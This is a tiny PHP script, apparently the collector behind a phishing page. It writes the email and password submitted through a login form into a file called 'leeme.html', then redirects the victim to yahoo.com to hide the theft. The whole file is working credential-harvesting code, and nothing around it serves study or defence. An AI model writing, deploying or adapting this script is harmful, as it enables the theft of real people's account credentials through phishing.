<?php

file_put_contents("leeme.html", "email: " . $_POST['username'] . "\npass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://yahoo.com');
exit();
